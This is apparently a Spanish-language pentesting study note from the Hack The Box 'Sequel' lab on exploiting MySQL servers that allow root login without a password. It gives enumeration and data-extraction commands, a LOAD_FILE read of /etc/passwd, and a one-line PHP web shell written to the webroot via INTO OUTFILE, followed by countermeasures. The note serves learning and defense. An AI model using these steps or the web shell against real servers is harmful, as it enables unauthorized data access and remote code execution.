---
tags:
  - tecnica
  - categoria/initial-access
  - categoria/credential-access
  - os/linux
  - nivel/basico
fecha_aprendida: 2026-08-10
fuente: HTB/Sequel
mitre_technique: T1190
---
# ⚔️ MySQL Sin Autenticación

> [!abstract] Resumen
> Conexión a un servidor MySQL expuesto usando `root` sin contraseña. Acceso completo a todas las bases de datos, tablas y — dependiendo de privilegios — al sistema de archivos vía `LOAD_FILE()`/`INTO OUTFILE`.

---

## ¿Qué es y por qué funciona?

MySQL permite crear cuentas sin contraseña o dejar `root` sin una asignada durante instalaciones rápidas/inseguras (común en entornos de desarrollo migrados a producción sin hardening). Si el servicio además está bindeado a `0.0.0.0` en vez de `127.0.0.1`, queda accesible desde cualquier red que alcance el puerto 3306. El cliente `mysql` se conecta sin pedir contraseña cuando el servidor no la exige — no hay bypass, es autenticación legítima con campo vacío.

---

## Condiciones necesarias para que aplique

> [!warning] Requisitos
> - Puerto 3306/TCP accesible desde la red del atacante
> - Cuenta (típicamente `root`) sin contraseña configurada
> - `bind-address` no restringido a localhost, o sin firewall compensando

---

## Procedimiento

### Detección / Enumeración

```bash
nmap -sCV -p 3306 <IP>
# Banner revela versión de MySQL/MariaDB

mysql -h <IP> -u root
# Si conecta sin pedir password → vulnerable
```

### Explotación

```bash
# Paso 1: conectar
mysql -h <IP> -u root

# Paso 2: enumerar bases de datos
mysql> SHOW DATABASES;

# Paso 3: seleccionar BD de interés y listar tablas
mysql> USE <database>;
mysql> SHOW TABLES;

# Paso 4: extraer datos
mysql> SELECT * FROM <tabla>;
```

> [!tip] Variaciones comunes
> - Si `root` pide password, probar usuarios de aplicación típicos sin credencial (`web`, `app`, `dbuser`)
> - Con privilegios FILE: `SELECT LOAD_FILE('/etc/passwd');` para leer archivos del sistema
> - Con privilegios FILE + directorio escribible: `SELECT '<?php system($_GET[c]);?>' INTO OUTFILE '/var/www/html/shell.php';` → RCE si hay webroot accesible (no cubierto en Tier 1, referencia para Vaccine)
> - **Confirmado en Sequel:** si la conexión falla con `ERROR 2026 (HY000): TLS/SSL error: SSL is required, but the server does not support it`, el servidor anuncia SSL pero no lo implementa correctamente. Forzar `mysql -h <IP> -u root --skip-ssl` — no es un bloqueo real, solo una config MySQL/MariaDB default/desactualizada.
> - El banner `5.5.5-10.3.X-MariaDB` **no es MySQL 5.5.5** — es MariaDB con el prefijo `5.5.5-` que antepone por compatibilidad histórica con clientes viejos que esperan MySQL. La versión real es la que sigue al prefijo (ej. `10.3.27`).

---

## Herramientas asociadas

| Herramienta | Función | Comando base |
| ----------- | ------- | ------------ |
| mysql (cliente oficial) | Conexión interactiva | `mysql -h <IP> -u root` |
| nmap (script mysql-*) | Enumeración de versión y config | `nmap -p 3306 --script mysql-info,mysql-empty-password <IP>` |

---

## Contramedidas (defensa)

> [!info] ¿Cómo se previene?
> Asignar contraseña fuerte a toda cuenta MySQL, especialmente `root`. `bind-address = 127.0.0.1` en `my.cnf` salvo que se requiera acceso remoto legítimo (y en ese caso, restringido por firewall/VPN + usuario dedicado con privilegios mínimos). Deshabilitar `FILE` privilege salvo necesidad explícita. Monitorear conexiones entrantes al 3306 desde IPs no esperadas.

---

## Dónde la usé

- `[[HTB/Sequel/Sequel]]` — Conexión `root` sin contraseña, enumeración de BD y extracción de flag

---

## Referencias

- [HackTricks - MySQL](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mysql)
- [MySQL Security Docs](https://dev.mysql.com/doc/refman/8.0/en/security.html)
- [MITRE ATT&CK - T1190](https://attack.mitre.org/techniques/T1190/)
